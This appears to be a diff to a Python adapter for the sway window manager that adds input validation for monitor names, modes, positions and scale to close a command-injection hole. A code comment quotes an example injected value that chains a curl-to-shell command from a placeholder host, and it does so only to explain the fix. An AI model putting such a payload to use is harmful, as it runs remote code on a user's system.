@@ -1,5 +1,6 @@
 import os
 import json
+import re
 import subprocess
 from abc import ABC, abstractmethod
 from typing import List
@@ -70,11 +71,41 @@ class WMAdapter(ABC):
         pass
 
 
+_MODE_RE = re.compile(r"^\d+x\d+$")
+_POSITION_RE = re.compile(r"^-?\d+ -?\d+$")
+_CONNECTOR_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")
+
+
+def _validate_connector_name(name: str):
+    if not _CONNECTOR_NAME_RE.match(str(name)):
+        raise ValueError(f"Invalid connector name {name!r}")
+
+
 def _validate_transform(transform: str):
     if transform not in VALID_TRANSFORMS:
         raise ValueError(
             f"Invalid transform {transform!r}; must be one of {sorted(VALID_TRANSFORMS)}"
         )
+
+
+def _validate_mode(mode: str):
+    if not _MODE_RE.match(str(mode)):
+        raise ValueError(f"Invalid mode {mode!r}; expected '<width>x<height>'")
+
+
+def _validate_position(position: str):
+    if not _POSITION_RE.match(str(position)):
+        raise ValueError(f"Invalid position {position!r}; expected '<x> <y>'")
+
+
+def _validate_scale(scale) -> float:
+    try:
+        value = float(scale)
+    except (TypeError, ValueError):
+        raise ValueError(f"Invalid scale {scale!r}; must be a number")
+    if not (0.1 <= value <= 10.0):
+        raise ValueError(f"Invalid scale {value!r}; must be between 0.1 and 10.0")
+    return value
 
 
 class SwayAdapter(WMAdapter):
@@ -94,49 +125,55 @@ class SwayAdapter(WMAdapter):
 
         try:
             outputs = self.ipc.get_outputs()
+            monitors = []
+            for out in outputs:
+                # i3ipc output object attributes might vary slightly,
+                # ensuring safe access.
+                make = getattr(out, 'make', 'Unknown')
+                model = getattr(out, 'model', 'Unknown')
+                serial = getattr(out, 'serial', 'Unknown')
+
+                rect = out.rect
+                current_mode = out.current_mode
+
+                width = rect.width
+                height = rect.height
+                refresh = 60.0  # Default
+
+                if current_mode:
+                    # i3ipc returns mode object
+                    width = current_mode.width
+                    height = current_mode.height
+                    refresh = current_mode.refresh / 1000.0
+
+                monitors.append(Monitor(
+                    name=out.name,
+                    make=make,
+                    model=model,
+                    serial=serial,
+                    width=width,
+                    height=height,
+                    refresh_rate=refresh,
+                    # `is not None`, not truthiness -- a real scale of 0 is
+                    # nonsensical hardware state, but `out.scale if out.scale
+                    # else 1.0` would also misfire on any other falsy-but-
+                    # meaningful numeric edge case; be explicit about what
+                    # we're actually checking for (missing/None).
+                    scale=out.scale if out.scale is not None else 1.0,
+                    active=out.active,
+                    pos_x=rect.x,
+                    pos_y=rect.y,
+                    transform=getattr(out, 'transform', None) or "normal",
+                ))
         except Exception as e:
-            # The IPC connection can drop/error mid-session (socket closed,
-            # sway restarted, etc.) well after a successful __init__ -- this
-            # used to be completely unguarded, unlike every other IPC call
-            # path in this class, producing a raw traceback instead of a
-            # catchable WMCommandError.
+            # Covers both the IPC call itself and the Monitor-construction
+            # loop above -- previously only the `get_outputs()` call was
+            # guarded, so an unexpected attribute-access failure while
+            # iterating (e.g. a malformed reply mid-socket-drop) still
+            # raised an uncatchable raw exception past every `except
+            # EzSwayError` handler in the app.
             raise WMCommandError(f"Failed to query sway outputs via IPC: {e}") from e
 
-        monitors = []
-        for out in outputs:
-            # i3ipc output object attributes might vary slightly,
-            # ensuring safe access.
-            make = getattr(out, 'make', 'Unknown')
-            model = getattr(out, 'model', 'Unknown')
-            serial = getattr(out, 'serial', 'Unknown')
-
-            rect = out.rect
-            current_mode = out.current_mode
-
-            width = rect.width
-            height = rect.height
-            refresh = 60.0  # Default
-
-            if current_mode:
-                # i3ipc returns mode object
-                width = current_mode.width
-                height = current_mode.height
-                refresh = current_mode.refresh / 1000.0
-
-            monitors.append(Monitor(
-                name=out.name,
-                make=make,
-                model=model,
-                serial=serial,
-                width=width,
-                height=height,
-                refresh_rate=refresh,
-                scale=out.scale if out.scale else 1.0,
-                active=out.active,
-                pos_x=rect.x,
-                pos_y=rect.y,
-                transform=getattr(out, 'transform', None) or "normal",
-            ))
         return monitors
 
     def _get_outputs_fallback(self) -> List[Monitor]:
@@ -159,18 +196,32 @@ class SwayAdapter(WMAdapter):
                     width=out.get("current_mode", {}).get("width", 0),
                     height=out.get("current_mode", {}).get("height", 0),
                     refresh_rate=out.get("current_mode", {}).get("refresh", 60000) / 1000.0,
-                    scale=out.get("scale", 1.0),
+                    scale=out.get("scale") if out.get("scale") is not None else 1.0,
                     active=out.get("active", False),
                     pos_x=out.get("rect", {}).get("x", 0),
                     pos_y=out.get("rect", {}).get("y", 0),
                     transform=out.get("transform") or "normal",
                 ))
             return monitors
-        except (FileNotFoundError, subprocess.CalledProcessError, json.JSONDecodeError) as e:
+        except (FileNotFoundError, PermissionError, subprocess.CalledProcessError, json.JSONDecodeError) as e:
             raise WMCommandError(f"Cannot query sway outputs (is sway running?): {e}") from e
 
     def enable_output(self, monitor_name: str, mode: str, position: str,
                        scale: float = 1.0, transform: str = "normal"):
+        # Every field here is interpolated straight into a raw sway IPC
+        # command string. mode/position/scale come from caller-supplied data
+        # that can originate from a profile JSON file (ProfileManager.
+        # load_profile) -- an unvalidated string like
+        # position="0 0; exec 'curl evil.sh|sh'" would previously reach
+        # sway's command parser verbatim (sway supports ';'-separated
+        # commands and 'exec'), making a maliciously crafted or corrupted
+        # profile file a command-injection vector. Every field is now
+        # strictly validated (allow-list / numeric-format / range) before
+        # it's allowed anywhere near the command string.
+        _validate_connector_name(monitor_name)
+        _validate_mode(mode)
+        _validate_position(position)
+        scale = _validate_scale(scale)
         _validate_transform(transform)
         cmd = (
             f"output {monitor_name} enable mode {mode} pos {position} "
@@ -179,6 +230,7 @@ class SwayAdapter(WMAdapter):
         self._run_command(cmd)
 
     def disable_output(self, monitor_name: str):
+        _validate_connector_name(monitor_name)
         cmd = f"output {monitor_name} disable"
         self._run_command(cmd)
 
